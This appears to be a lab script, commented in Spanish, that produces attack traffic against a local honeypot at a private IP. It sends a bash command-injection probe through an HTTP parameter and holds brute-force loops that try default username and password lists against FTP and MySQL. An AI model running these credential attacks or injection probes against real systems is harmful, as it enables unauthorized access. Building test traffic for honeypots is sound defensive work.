# scripts/attack_heralding.py

import requests

def simulate_bash_http_attack(dst_ip):
    # Construir la URL con el parámetro que intenta ejecutar una shell bash
    url = f"http://{dst_ip}:80/index.php?cmd=bash+-c+'echo+hello'"

    try:
        # Enviar la solicitud HTTP GET
        response = requests.get(url)

        # Comprobar si la solicitud fue exitosa y analizar la respuesta si es necesario
        if response.status_code == 200:
            print("Solicitud HTTP exitosa.")
        else:
            print("Error al enviar la solicitud HTTP.")

    except requests.exceptions.RequestException as e:
        print(f"Error al enviar la solicitud HTTP: {e}")


import ftplib
import traceback

# Funcion para brute force de credenciales en ftp
def brute_force_ftp(host, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(host, port)
                    ftp.login(username, password)
                    print(f"Credenciales encontradas: {username}:{password}")
                    return True
            except Exception as e:
                print(f"Error al intentar iniciar sesión: {e}")
                #traceback.print_exc()

    print("[+] Credenciales no encontradas")



import mysql.connector

# Funcion para brute force de credenciales en mysql
def brute_force_mysql(host, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                conn = mysql.connector.connect(host=host, port=port, user=username, password=password)
                print(f"Credenciales encontradas: {username}:{password}")
                conn.close()
                return True
            except mysql.connector.Error as err:
                print(f"Error al intentar iniciar sesión: {err}")


def main():
    host = "172.18.0.2"
    user_list = ["admin", "root", "john", "phil"]
    passw_list = ["admin", "root", "1234", "password"]

    # brute_force_ftp(host, 21, user_list, passw_list)
    #brute_force_mysql(host, 3306, user_list, passw_list)
	simulate_bash_http_attack("172.18.0.2")

if __name__ == "__main__":
    main()
